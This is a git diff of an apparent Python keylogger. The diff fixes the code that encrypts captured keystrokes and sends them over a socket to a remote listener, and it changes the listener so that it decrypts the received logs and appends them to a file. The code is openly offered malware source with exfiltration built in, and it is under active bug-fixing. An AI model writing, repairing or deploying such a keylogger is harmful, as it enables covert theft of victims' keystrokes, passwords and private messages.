@@ -1,4 +1,4 @@
-import argpars @ {datetime.now()}e
+import argparse
 import textwrap
 import keyboard
 import sys
@@ -72,9 +72,8 @@ class Keylogger:
             self.end_time = datetime.now()
 
             # If there is keystrokes to send, send them :^)
-            if self.log:
-                payload = f"\n--- New Log Instance @ {self.time} ---\n{self.log}\n--- End Of Log Instance @ {self.end_time} ---\n"
-                self.socket.send(self.encrypt(payload))
+            payload = f"\n--- New Log Instance @ {self.time} ---\n{self.log}\n--- End Of Log Instance @ {self.end_time} ---\n"
+            self.socket.send(self.encrypt(payload))
 
         self.log = ""
 
@@ -125,7 +124,7 @@ class Keylogger:
         decrypted = cipher_aes.decrypt_and_verify(ciphertext, tag)
 
         plaintext = zlib.decompress(decrypted)
-        return str(plaintext)
+        return plaintext
 
     # For the listener - handle a received a conncetion
     def handle(self, client_socket):
@@ -139,15 +138,16 @@ class Keylogger:
             else:
                 break
 
-            # TODO Transfer keys on initial connnection
+            # Send public key on initial conection
             if buf.decode() == "REQ_PUB":
                 client_socket.send(self.public_key)
                 buf=b""
             else:
-                with open(self.args.outfile, "w") as f:
-                    # TODO save buf as a var and replace \n as newline
-                    f.write(self.decrypt(buf))
+                payload = self.decrypt(buf).decode('UTF-8')
+                with open(self.args.outfile, "a") as f:
+                    f.write(payload)
                     print(f"[+] Wrote data to {self.args.outfile} @ {datetime.now()}")
+                    buf = b""
 
     # Create the listener to receive exfiltrated data
     def listen(self):
